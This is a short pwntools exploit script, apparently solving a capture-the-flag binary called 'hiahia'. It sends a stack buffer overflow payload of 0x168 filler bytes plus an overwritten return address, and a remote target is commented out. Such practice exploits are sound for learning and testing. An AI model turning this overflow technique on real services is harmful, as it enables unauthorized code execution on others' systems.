from pwn import *

p = process("./hiahia")
# p = remote("149.248.7.48" , 8888)
p.recvuntil("flag!\n")
payload = "a" * 0x168 + p64(0x4007A8)
p.sendline(payload)
print p.recvall()